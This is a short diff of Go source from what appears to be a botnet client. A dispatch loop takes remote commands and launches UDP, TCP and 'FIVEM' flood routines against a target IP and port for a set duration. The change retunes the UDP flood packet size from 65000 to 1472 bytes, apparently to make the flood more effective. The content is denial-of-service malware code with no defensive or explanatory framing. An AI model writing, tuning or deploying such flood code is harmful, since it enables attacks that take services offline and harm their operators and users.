@@ -955,7 +955,7 @@ func main() {
 
 			switch cmd.Method {
 			case "UDP":
-				go AUdpFlood(cmd.TargetIP, strconv.Itoa(cmd.TargetPort), cmd.Duration, 65000, sessionID)
+				go AUdpFlood(cmd.TargetIP, strconv.Itoa(cmd.TargetPort), cmd.Duration, 1472, sessionID)
 			case "TCP":
 				go ATcpFlood(cmd.TargetIP, strconv.Itoa(cmd.TargetPort), cmd.Duration, sessionID)
 			case "FIVEM":
